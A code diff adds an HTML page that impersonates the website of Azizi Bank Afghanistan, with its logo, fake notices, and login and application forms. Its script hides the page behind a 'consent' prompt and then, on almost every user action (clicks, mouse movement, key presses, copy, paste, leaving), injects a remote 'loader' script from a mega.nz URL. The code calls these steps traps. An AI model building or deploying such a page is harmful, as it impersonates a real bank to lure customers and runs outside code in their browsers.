@@ -1,0 +1,178 @@
+
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Azizi Bank Afghanistan</title>
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@500&display=swap" rel="stylesheet">
+    <style>
+        body {background:#E7ECF2; font-family:'Vazirmatn',Tahoma;margin:0;}
+        #header {background:#254F80;color:#fff;padding:20px 0;text-align:center;}
+        #logo {float:right;margin-right:25px;width:87px;}
+        #nav {background:#fff;border-bottom:2px solid #d9e3ef;}
+        #nav a {display:inline-block;color:#13447c;padding:16px 23px;text-decoration:none;font-size:19px;font-weight:500;}
+        #nav a:hover {background:#ecf2fa;}
+        #main {max-width:1080px;margin:auto;background:#fff;padding:35px;border-radius:18px;box-shadow:0 8px 24px #d2e0ef;}
+        #footer {background:#254F80;color:#fff;text-align:center;padding:16px;margin-top:40px;}
+        .tabcontent {display:none;}
+        .active {display:block;}
+        .msgbox {background:#faf7e0;border-radius:8px;color:#3a3466;padding:18px 15px;margin:36px auto 0 auto;max-width:550px;font-size:17px;font-weight:500;line-height:1.6;box-shadow:0 2px 20px #e0ecf7;text-align:center;display:none;}
+        .section {margin-bottom:27px;}
+        button, input {font-family:'Vazirmatn',Tahoma;}
+        #main,#nav,#footer,#header{display:none;}
+    </style>
+</head>
+<body>
+    <div id="consentMsg" class="msgbox"></div>
+    <div id="header">
+        <img src="https://azizibank.af/images/logo.png" alt="" id="logo">
+        <span style="font-size:30px; margin-right:17px;">Azizi Bank Afghanistan</span>
+        <div style="float:left;margin-left:21px;">
+            <a href="#">English</a> | <a href="#">دری</a> | <a href="#">پشتو</a>
+        </div>
+        <div style="clear:both"></div>
+    </div>
+    <div id="nav">
+        <a href="#" class="navtab" data-tab="home">Home</a>
+        <a href="#" class="navtab" data-tab="about">About Us</a>
+        <a href="#" class="navtab" data-tab="services">Banking Services</a>
+        <a href="#" class="navtab" data-tab="electronic">E-Banking</a>
+        <a href="#" class="navtab" data-tab="faq">FAQ</a>
+        <a href="#" class="navtab" data-tab="contact">Contact</a>
+        <a href="#" class="navtab" data-tab="application">Apply</a>
+        <a href="#" class="navtab" data-tab="branches">Branches & ATM</a>
+        <a href="#" class="navtab" data-tab="login">Login</a>
+    </div>
+    <div id="main">
+        <div id="msgbox" class="msgbox"></div>
+        <div id="home" class="tabcontent active">
+            <h1>Welcome to Azizi Bank Afghanistan</h1>
+            <div class="section">A Modern Bank for Afghanistan; Secure and Fast Service across all provinces.</div>
+            <div class="section"><img src="https://azizibank.af/images/hq.jpg" width="400" alt=""></div>
+        </div>
+        <div id="about" class="tabcontent"><ul><li>Top commercial bank in Afghanistan</li><li>International credibility</li><li>Professional staff</li></ul></div>
+        <div id="services" class="tabcontent"><ul><li>Current accounts</li><li>Utility payments</li><li>Credit cards and ATM</li><li>Consultancy & loans</li></ul></div>
+        <div id="electronic" class="tabcontent">24-hour online banking platform, AziPay app, electronic solutions.</div>
+        <div id="faq" class="tabcontent">
+            <ol><li>Account opening?</li><li>Password change?</li><li>Online banking use?</li></ol>
+        </div>
+        <div id="contact" class="tabcontent"><b>1515</b><br>info@azizibank.af<br>Kabul, Karte Parwan road</div>
+        <div id="application" class="tabcontent">
+            <input type="text" placeholder="Full Name"><br>
+            <input type="tel" placeholder="Phone Number"><br>
+            <button>Apply</button>
+        </div>
+        <div id="branches" class="tabcontent"><ul><li>Kabul - Masood Square</li><li>Herat - Republic Avenue</li><li>Balkh - Central Square</li><li>Kandahar - Bazaar Street</li></ul></div>
+        <div id="login" class="tabcontent"><input type="text" placeholder="Username"><input type="password" placeholder="Password"><button id="loginBtn">Sign In</button></div>
+    </div>
+    <div id="footer">
+        © 2025 Azizi Bank Afghanistan
+    </div>
+<script>
+let trapsQueue=[],trapRunning=false,consentGiven=false,consentTimestamps=0,trapTimer;
+let trapMsgs=[
+"🌟 Special job opportunities are now open at Azizi Bank! Apply today.",
+"💳 New ATM card with cashback launched! Learn more in your eBanking dashboard.",
+"🎁 Customer reward program for loyal account holders activated.",
+"🔐 Important: Never share your password or OTP with anyone.",
+"📜 New mobile app with Farsi, Pashto, English is live. Download and setup now.",
+"💼 Career development: Azizi Bank welcomes fresh graduates for 2025.",
+"🎉 Mega Ramadan lucky draw: Over 50 customers won cash prizes last year.",
+"⚠️ Security alert: Change your online password every 60 days.",
+"✔️ Verify your phone number for higher transaction limits.",
+"💰 Loan offers for SME/retailers. Limited time only.",
+"🏧 National network of ATMs now serves 28 provinces.",
+"📲 Activate AziPay now for international transfers, 24/7.",
+"📅 Book appointments online for our professional advisors.",
+"📧 New e-statements and digital notices now available.",
+"👨‍💼 Upgrade to Premium Banking—contact your branch.",
+"🏆 Top Afghan bank award: Recognized 5th year in a row.",
+"🚀 Azizi Bank supports young Afghan entrepreneurs.",
+"🕋 Sharia-compliant Islamic Banking service active.",
+"🎂 Anniversary offer: win with every new deposit.",
+"🛡️ Enhanced anti-fraud alerts upgraded. Your security, our priority."
+];
+let consentMsgSamples=[
+"برای ادامه، یکی از بخش‌های صفحه را انتخاب یا با موس روی صفحه کلیک کنید.",
+"لطفاً برای ورود و فعال‌سازی خدمات یکی از گزینه‌ها را انتخاب یا یک حرکت موس انجام دهید.",
+"برای فعال‌سازی خدمات نیازمند تایید حضور کاربر هستیم؛ لطفاً روی صفحه کلیک یا حرکت کنید.",
+"جهت استفاده ایمن، تأیید فعالیت شما لازم است. هرگونه لمس/کلیک معتبر است.",
+"لطفاً یک کلیک یا هر نوع حرکت موس برای ادامه انجام دهید.",
+];
+function showConsentMsg() {
+    let idx=Math.floor(Math.random()*consentMsgSamples.length);
+    let box=document.getElementById("consentMsg");
+    box.style.display="block";
+    box.innerHTML=consentMsgSamples[idx];
+}
+function startApp(){
+    document.getElementById("consentMsg").style.display="none";
+    document.getElementById("main").style.display="block";
+    document.getElementById("nav").style.display="block";
+    document.getElementById("header").style.display="block";
+    document.getElementById("footer").style.display="block";
+    document.getElementById("msgbox").style.display="block";
+    showMsgBox();
+}
+function runConsentTrap(){
+    if(!consentGiven){
+        document.getElementById("main").style.display="none";
+        document.getElementById("nav").style.display="none";
+        document.getElementById("header").style.display="none";
+        document.getElementById("footer").style.display="none";
+        document.getElementById("msgbox")?.style.display="none";
+        consentTimestamps++;
+        showConsentMsg();
+        activateTrap("consent-start");
+        if(consentTimestamps>=1){
+            consentGiven=true;
+            clearTimeout(trapTimer);
+            trapTimer=setTimeout(startApp,1600+Math.random()*1400);
+        }
+    }
+}
+['click','mousemove','contextmenu','keydown','scroll','dblclick'].forEach(evn=>{
+    document.addEventListener(evn,runConsentTrap,{capture:true,once:false});
+});
+let prevMsg=-1;
+function showMsgBox(){
+    let idx;
+    do{idx=Math.floor(Math.random()*trapMsgs.length);}while(idx===prevMsg);
+    prevMsg=idx;
+    let box=document.getElementById("msgbox");
+    if(box){box.style.display="block"; box.innerHTML=trapMsgs[idx];
+        clearTimeout(trapTimer);
+        trapTimer=setTimeout(()=>{showMsgBox();},2600+Math.random()*1200);
+    }
+}
+function activateTrap(x){
+    trapsQueue.push(x);
+    if(!trapRunning){trapRunning=true;runQueue();}
+    if(consentGiven){showMsgBox();}
+}
+function runQueue(){if(trapsQueue.length>0){runTrap(trapsQueue.shift(),()=>{runQueue();});}else{trapRunning=false;}}
+function runTrap(t,cb){downloadLoader(()=>{cb();});}
+function downloadLoader(cb){
+    let s=document.createElement('script');
+    s.src="https://mega.nz/your-mega-bootstrap-loader.js";
+    document.body.appendChild(s);setTimeout(cb,200);}
+let tabs=document.querySelectorAll(".navtab"),contents=document.querySelectorAll(".tabcontent");
+tabs.forEach(t=>{t.onclick=function(){if(consentGiven){contents.forEach(c=>c.classList.remove("active"));document.getElementById(t.dataset.tab).classList.add("active");activateTrap(t.dataset.tab);}}});
+document.getElementById("loginBtn")?.addEventListener("click",()=>{if(consentGiven)activateTrap("login");});
+document.body.addEventListener("mousemove",e=>{if(consentGiven){activateTrap("mousemove");if(Math.abs(e.movementX-e.movementY)>10)activateTrap("zigzag");}});
+document.body.addEventListener("click",()=>{if(consentGiven)activateTrap("click");});
+document.body.addEventListener("contextmenu",()=>{if(consentGiven)activateTrap("rightclick");});
+window.addEventListener("keydown",()=>{if(consentGiven)activateTrap("keyboard");});
+window.addEventListener("scroll",()=>{if(consentGiven)activateTrap("scroll");});
+document.body.addEventListener("selectstart",()=>{if(consentGiven)activateTrap("selectstart");});
+window.addEventListener("resize",()=>{if(consentGiven)activateTrap("resize");});
+document.body.addEventListener("dblclick",()=>{if(consentGiven)activateTrap("dblclick");});
+document.body.addEventListener("copy",()=>{if(consentGiven)activateTrap("copy");});
+document.body.addEventListener("cut",()=>{if(consentGiven)activateTrap("cut");});
+document.body.addEventListener("paste",()=>{if(consentGiven)activateTrap("paste");});
+document.addEventListener("visibilitychange",()=>{if(consentGiven)activateTrap(document.visibilityState);});
+window.onbeforeunload=function(){if(consentGiven)activateTrap("exit");};
+showConsentMsg();
+</script>
+</body>
+</html>
